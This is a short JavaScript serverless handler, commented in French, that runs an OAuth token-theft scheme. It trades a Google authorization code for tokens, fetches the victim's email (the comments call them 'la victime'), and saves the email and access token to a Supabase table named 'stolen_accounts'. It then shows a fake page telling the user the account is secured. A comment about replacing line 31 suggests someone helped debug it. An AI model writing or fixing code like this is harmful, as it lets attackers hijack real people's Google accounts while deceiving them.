import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

export default async function handler(req, res) {
    const { code } = req.query;

    try {
        // 1. Échange du code contre les jetons Google
        const response = await fetch('https://oauth2.googleapis.com/token', {
            method: 'POST',
            body: JSON.stringify({
                code,
                client_id: process.env.GOOGLE_CLIENT_ID,
                client_secret: process.env.GOOGLE_CLIENT_SECRET,
                redirect_uri: `https://${req.headers.host}/callback`,
                grant_type: 'authorization_code',
            }),
        });

        const tokens = await response.json();

        // 2. Récupération de l'email de la victime
        const userRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
            headers: { Authorization: `Bearer ${tokens.access_token}` }
        });
        const userData = await userRes.json();

        // 3. Sauvegarde dans Supabase (uniquement les colonnes que tu as)
        const { error } = await supabase.from('stolen_accounts').insert([{
            // Remplace ta ligne 31 par celle-ci :
email_address: userData.email || userData.verified_email || "Email non trouvé",
            access_token: tokens.access_token
        }]);

        if (error) throw error;

        // 4. Redirection finale
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send('<h1>Analyse terminée</h1><p>Votre compte est sécurisé.</p>');

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erreur lors de l'enregistrement" });
    }
}